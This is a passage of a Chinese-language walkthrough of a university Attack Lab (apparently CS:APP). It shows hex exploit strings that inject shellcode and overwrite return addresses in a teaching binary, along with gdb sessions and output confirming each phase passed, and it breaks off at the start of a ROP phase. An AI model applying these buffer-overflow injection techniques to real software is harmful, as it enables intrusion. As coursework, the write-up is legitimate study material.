<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">  401bb7</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">	b8 </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">01</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">       	mov</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    $0x1,%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">eax</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">  401bbc</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">	48</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 83</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> c4 </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">18</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">          	add</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    $0x18,%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rsp</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">  401bc0</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">	c3                   	</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">ret</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">gdb</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> ctarget</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">b</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;"> *</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">getbuf</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> +</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 8</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">layout</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> asm</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">layout</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> regs</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">r</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">p</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;"> $rsp</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>通过调试，我们发现栈指针 <code>%rsp</code> 指向 <code>0x5566c3e8</code> 且正是字符串的储存地址（调试细节此处未呈现）。因此，我们可以构造如下的输入：</p><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-text"><span class="line"><span>/* phase2.txt */</span></span>
<span class="line"><span>bf 66 ce c8 24       	/* mov    $0x24c8ce66, %edi */</span></span>
<span class="line"><span>68 67 1c 40 00       	/* push   $0x401c67 */</span></span>
<span class="line"><span>c3                   	/* ret */</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>00 00 00 00 00</span></span>
<span class="line"><span>e8 c3 66 55 00 00 00 00 /* Address of injected code */</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>转换为原始字节序列并传递给 <code>ctarget</code> 程序：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">cat</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> phase2.txt</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> |</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> ./hex2raw</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> |</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> ./ctarget</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-text"><span class="line"><span>Cookie: 0x24c8ce66</span></span>
<span class="line"><span>Type string:Touch2!: You called touch2(0x24c8ce66)</span></span>
<span class="line"><span>Valid solution for level 2 with target ctarget</span></span>
<span class="line"><span>PASS: Sent exploit string to server to be validated.</span></span>
<span class="line"><span>NICE JOB!</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="phase-3" tabindex="-1"><a class="header-anchor" href="#phase-3"><span>Phase 3</span></a></h2><p>在 phase 3 中，我们需要针对 <code>ctarget</code> 程序实现代码注入攻击。</p><div class="language-c line-numbers-mode" data-highlighter="shiki" data-ext="c" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-c"><span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">void</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> test</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">()</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">{</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">    int</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> val</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    val </span><span style="--shiki-light:#999999;--shiki-dark:#666666;">=</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> getbuf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">();</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">    printf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">No exploit. Getbuf returned 0x</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">%x\n</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> val</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-c line-numbers-mode" data-highlighter="shiki" data-ext="c" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-c"><span class="line"><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">/* Compare string to hex represention of unsigned value */</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">int</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> hexmatch</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">unsigned</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;"> val</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> char</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> *</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">sval</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">{</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">    char</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;"> cbuf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">[</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">110</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">];</span></span>
<span class="line"><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">    /* Make position of check string unpredictable */</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">    char</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> *</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">s </span><span style="--shiki-light:#999999;--shiki-dark:#666666;">=</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> cbuf </span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">+</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> random</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">()</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> %</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 100</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">    sprintf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">s</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;"> &quot;</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">%.8x</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> val</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">    return</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> strncmp</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">sval</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> s</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 9</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> ==</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 0</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">}</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">void</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> touch3</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">char</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> *</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">sval</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">{</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    vlevel </span><span style="--shiki-light:#999999;--shiki-dark:#666666;">=</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 3</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;"> /* Part of validation protocol */</span></span>
<span class="line"><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">    if</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> (</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">hexmatch</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">cookie</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> sval</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">))</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> {</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">        printf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">Touch3!: You called touch3(</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">\&quot;%s\&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">)</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">\n</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> sval</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">        validate</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">3</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">    }</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;"> else</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> {</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">        printf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">Misfire: You called touch3(</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">\&quot;%s\&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">)</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">\n</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> sval</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">        fail</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">3</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">    }</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">    exit</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">0</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>我们需要构造一个输入，使得 <code>getbuf</code> 函数返回后，调用 <code>touch3</code> 函数。为此，我们需要注入一段代码，该代码将 cookie 的地址 <code>mov</code> 给 <code>%rdi</code> 作为参数，并将 <code>touch3</code> 函数的地址 <code>pushq</code> 压入栈中，最后 <code>ret</code> 返回，这样程序就会跳转到 <code>touch3</code> 函数执行。</p><p>与 phase 2 类似，我们需要用注入代码的起始位置地址（即储存字符串的地址）覆盖 <code>getbuf</code> 函数的返回地址。但除此之外，我们还需要将 cookie 储存在某个可控且安全的位置，并且将其地址 <code>mov</code> 给 <code>%rdi</code> 。</p><p><code>getbuf</code> 函数在栈上分配的 0x18 字节的空间似乎足够存放我们注入的代码和 cookie，我们可以将 cookie 存放在栈上的局部变量 <code>buf</code> 中。但当调用 <code>hexmatch</code> 和 <code>strncmp</code> 这两个函数时，它们会将数据压入栈中，从而可能覆盖一部分原本存储着 <code>getbuf</code> 函数所用缓冲区的内存。</p><p>我们先尝试将 cookie 存放在 <code>buf</code> 中：</p><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-text"><span class="line"><span>/* phase3.txt */</span></span>
<span class="line"><span>48 c7 c7 f5 c3 66 55 	/* mov    $0x5566c3f5, %rdi */</span></span>
<span class="line"><span>68 8d 1d 40 00       	/* push   $0x401d8d */</span></span>
<span class="line"><span>c3                   	/* ret */</span></span>
<span class="line"><span>32 34 63 38 63 65 36 36 00 /* cookie string &quot;24c8ce66&quot; */</span></span>
<span class="line"><span>00 00</span></span>
<span class="line"><span>e8 c3 66 55 00 00 00 00 /* Address of injected code */</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">./hex2raw</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &lt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> phase3.txt</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> phase3.raw</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>启动调试，观察栈空间的变化：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">gdb</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> ctarget</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">b</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> touch3</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">layout</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> asm</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">layout</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> regs</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">r</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &lt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> phase3.raw</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在调用 <code>hexmatch</code> 函数前后，分别执行 <code>x/20x 0x5566c3e8</code> ，查看栈空间内容：</p><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-text"><span class="line"><span>(gdb) x/20x 0x5566c3e8</span></span>
<span class="line"><span>0x5566c3e8:	0x74747474	0x74747474	0x74747474	0x74747474</span></span>
<span class="line"><span>0x5566c3f8:	0x00000000	0x00000000	0x00000000	0x00000000</span></span>
<span class="line"><span>0x5566c408:	0x0041d668	0x00000000	0x0040010d	0x00000000</span></span>
<span class="line"><span>0x5566c418:	0x55855f50	0x00000000	0x004024fa	0x00000000</span></span>
<span class="line"><span>0x5566c428:	0x00000000	0x00000000	0xf4f4f4f4	0xf4f4f4f4</span></span>
<span class="line"><span>0x5566c438:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4</span></span>
<span class="line"><span>(gdb) x/20x 0x5566c3e8</span></span>
<span class="line"><span>0x5566c3e8:	0x55855f58	0x00000000	0x0040458a	0x00000000</span></span>
<span class="line"><span>0x5566c3f8:	0x00401f0d	0x00000000	0x00400000	0x00000000</span></span>
<span class="line"><span>0x5566c408:	0x55855fad	0x00000000	0x004024fa	0x00000000</span></span>
<span class="line"><span>0x5566c418:	0x00000000	0x00000000	0xf4f4f4f4	0xf4f4f4f4</span></span>
<span class="line"><span>0x5566c428:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>对比发现，在调用 <code>hexmatch</code> 函数后，栈空间的内容发生了变化，原本存储 cookie 的位置被覆盖了。因此，我们需要为 cookie 寻找一个更安全的位置，发现 <code>0x5566c414</code> 位置起的 12 个字节全为 0x00 ，且在调用 <code>hexmatch</code> 函数前后没有发生变化，我们可以将 cookie 存放在该位置。</p><p>同时为了防止会上层栈帧的覆盖造成不必要的影响，我们不改动除 cookie 之外的内容。</p><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-text"><span class="line"><span>/* phase3.txt */</span></span>
<span class="line"><span>48 c7 c7 14 c4 66 55 	/* mov    $0x5566c414, %rdi */</span></span>
<span class="line"><span>68 8d 1d 40 00       	/* push   $0x401d8d */</span></span>
<span class="line"><span>c3                   	/* ret */</span></span>
<span class="line"><span>00 00 00</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>e8 c3 66 55 00 00 00 00 /* Address of injected code */</span></span>
<span class="line"><span>00 5f 68 55 00 00 00 00</span></span>
<span class="line"><span>fa 24 40 00</span></span>
<span class="line"><span>32 34 63 38 63 65 36 36 00 /* cookie string &quot;24c8ce66&quot; */</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>转换为原始字节序列并传递给 <code>ctarget</code> 程序：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">cat</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> phase3.txt</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> |</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> ./hex2raw</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> |</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> ./ctarget</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-text"><span class="line"><span>Cookie: 0x24c8ce66</span></span>
<span class="line"><span>Type string:Touch3!: You called touch3(&quot;24c8ce66&quot;)</span></span>
<span class="line"><span>Valid solution for level 3 with target ctarget</span></span>
<span class="line"><span>PASS: Sent exploit string to server to be validated.</span></span>
<span class="line"><span>NICE JOB!</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="phase-4" tabindex="-1"><a class="header-anchor" href="#phase-4"><span>Phase 4</span></a></h2><p>在 phase 4 中，我们需要针对 <code>rtarget</code> 程序实现 ROP 攻击。</p><div class="language-c line-numbers-mode" data-highlighter="shiki" data-ext="c" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-c"><span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">void</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> test</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">()</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">{</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">    int</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> val</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    val </span><span style="--shiki-light:#999999;--shiki-dark:#666666;">=</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> getbuf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">();</span></span>
